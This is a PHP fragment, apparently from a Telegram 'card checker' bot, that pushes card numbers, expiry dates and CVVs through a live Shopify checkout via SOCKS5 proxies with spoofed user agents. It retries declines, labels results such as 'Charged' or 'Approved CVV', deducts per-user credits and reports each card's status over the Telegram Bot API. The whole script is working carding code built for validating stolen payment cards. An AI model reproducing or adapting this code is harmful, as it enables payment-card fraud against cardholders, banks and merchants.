curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
$new1 = curl_exec($ch);
$autht3 = trim(strip_tags(getStr($new1,'name="authenticity_token" value="','"')));

#New2 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, ''.$urll.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$autht3.'&checkout%5Bclient_details%5D%5Bbrowser_width%5D=375&checkout%5Bclient_details%5D%5Bbrowser_height%5D=553&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=32&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=0');
$new2 = curl_exec($ch);
curl_close($ch);

#New3. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, ''.$urll.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
$new3 = curl_exec($ch);
$autht4 = trim(strip_tags(getStr($new3,'name="authenticity_token" value="','"')));

Repeat:

#New4 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://deposit.us.shopifycs.com/sessions');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'Host: deposit.us.shopifycs.com',
'Origin: https://checkout.shopifycs.com',
'Referer: https://checkout.shopifycs.com/',
'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$c1.' '.$c2.' '.$c3.' '.$c4.'","name":"ajay singh","month":'.$mon.',"year":'.$year.',"verification_value":"'.$cvv.'"},"payment_session_scope":"www.mychoicesoftware.com"}');
$new4 = curl_exec($ch);
$pidd = trim(strip_tags(getStr($new4,'id":"','"')));
curl_close($ch);

#New5 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, ''.$urll.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$autht4.'&previous_step=payment_method&step=&s='.$pidd.'&checkout%5Bpayment_gateway%5D=19162241&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Btotal_price%5D=1500&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=375&checkout%5Bclient_details%5D%5Bbrowser_height%5D=553&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=32&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=0');
$new5 = curl_exec($ch);
curl_close($ch);

#07. Req
$ch = curl_init();
do {
curl_setopt($ch, CURLOPT_URL, ''.$urll.'/processing');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
$curl7 = curl_exec($ch);
curl_close($ch);

$response_code = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
if ($response_code == 0 || $response_code > 400) { $retry_count++; } else {break;}

  $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙍𝙚𝙩𝙧𝙮𝙞𝙣𝙜 𝘾𝙤𝙪𝙣𝙩 $retry_count ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
  
} while ($retry_count < $max_retries);
if ($retry_count === $max_retries) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙈𝙖𝙭 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

#8. Req
$ch = curl_init();
do {
curl_setopt($ch, CURLOPT_URL, ''.$urll.'/processing?from_processing_page=1');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
$curl8 = curl_exec($ch);
$rspppppp = trim(strip_tags(getStr($curl8,'</svg><div class="notice__content"><p class="notice__text">','</p>')));
curl_close($ch);

$response_code = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
if ($response_code == 0 || $response_code > 400) { $retry_count++; } else {break;}

  $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙍𝙚𝙩𝙧𝙮𝙞𝙣𝙜 𝘾𝙤𝙪𝙣𝙩 $retry_count ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
  
} while ($retry_count < $max_retries);
if ($retry_count === $max_retries) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙈𝙖𝙭 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙄𝙣 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

#9. Req
$ch = curl_init();
do {
curl_setopt($ch, CURLOPT_URL, ''.$urll.'?from_processing_page=1&validate=true');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
$curl9 = curl_exec($ch);
print_r ($curl9);
$rsppppp = trim(strip_tags(getStr($curl9,'</svg><div class="notice__content"><p class="notice__text">','</p>')));

$response_code = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
if ($response_code == 0 || $response_code > 400) { $retry_count++; } else {break;}

  $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙍𝙚𝙩𝙧𝙮𝙞𝙣𝙜 𝘾𝙤𝙪𝙣𝙩 $retry_count ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
  
} while ($retry_count < $max_retries);
if ($retry_count === $max_retries) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙈𝙖𝙭 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

curl_close($ch);
  
#10. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, ''.$urll.'/thank_you');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
$curl10 = curl_exec($ch);
$Messagesuccess = trim(strip_tags(getStr($curl10,'<h1 class="visually-hidden">','</h1>')));
$stealcode = trim(strip_tags(getStr($curl10,'<h1 class="visually-hidden">','</h1>')));
curl_close($ch);

if ((strpos($rsppppp, 'There was an issue processing your payment. Try again or use a different payment method')) or (strpos($rsppppp, ' No Match')) or (strpos($rsppppp, 'Street address and postal code do not match')))
{ goto Repeat;}

if ((strpos($curl10, 'Thank you for your purchase')) or (strpos($curl9, 'AVS REJECTED')) or (strpos($curl9, 'Insufficient funds')))
{ $creditsToDeduct = 2;} 
else 
{ $creditsToDeduct = 1;}
$creditsFile = fopen('Tools/Credits.txt', 'r+');
while (!feof($creditsFile)) {
    $line = fgets($creditsFile);
    $lineParts = explode(' ', $line);
    $userIdd = trim($lineParts[0]);
    $credits = intval(trim($lineParts[1]));
    if ($userIdd == $userId) {
        $newCredits = max(0, $credits - $creditsToDeduct);
        fseek($creditsFile, -strlen($line), SEEK_CUR);
        fwrite($creditsFile, "$userId $newCredits\n");
        break;}}
fclose($creditsFile);

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝙍𝙚𝙨𝙪𝙡𝙩 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

$end_time = microtime(true);
$time0 = $end_time - $start_time;
$time = substr_replace($time0, '',4);

if (strpos($curl10, 'Thank you for your purchase')){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ✅ Charged 15$ ( $Messagesuccess )\n--» <u>Gateway </u> : Shopify+Braintree (v3) 15$ Charge\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Took ⌛</u> : <code>$time seconds (Retries - $retry_count) </code>\n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
elseif ((strpos($curl10, 'AVS REJECTED')) || (strpos($curl9, 'AVS REJECTED'))){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ✅ AVS APPROVED ( $rsppppp )\n--» <u>Gateway </u> : Shopify+Braintree (v3) 15$ Charge\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Took ⌛</u> : <code>$time seconds (Retries - $retry_count) </code>\n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
elseif ((strpos($curl10, 'CVV2 Mismatch')) || (strpos($curl9, 'CVV2 Mismatch'))){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ✅ Authorized CCN ( $rsppppp )\n--» <u>Gateway </u> : Shopify+Braintree (v3) 15$ Charge\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Took ⌛</u> : <code>$time seconds (Retries - $retry_count) </code>\n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
elseif ((strpos($curl9, 'Insufficient funds')) || (strpos($curl10, 'Insufficient funds'))){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ✅ Approved CVV ( $rsppppp )\n--» <u>Gateway </u> : Shopify+Braintree (v3) 15$ Charge\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Took ⌛</u> : <code>$time seconds (Retries - $retry_count) </code>\n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
elseif ((strpos($curl10, 'notice notice--error')) || (strpos($curl9, 'notice notice--error')) || (strpos($curl10, 'Do Not Honor')) || (strpos($curl9, 'Do Not Honor')) || (strpos($curl10, '</svg><div class="notice__content"><p class="notice__text">')) || (strpos($curl9, '</svg><div class="notice__content"><p class="notice__text">')) || (strpos($curl10, 'declined')) || (strpos($curl9, 'declined'))){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Charge ( $rsppppp )\n--» <u>Gateway </u> : Shopify+Braintree (v3) 15$ Charge\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Took ⌛</u> : <code>$time seconds (Retries - $retry_count) </code>\n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
else {
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Charge ( $rsppppp )\n--» <u>Gateway </u> : Shopify+Braintree (v3) 15$ Charge\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Took ⌛</u> : <code>$time seconds (Retries - $retry_count) </code>\n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
curl_close($ch);

?>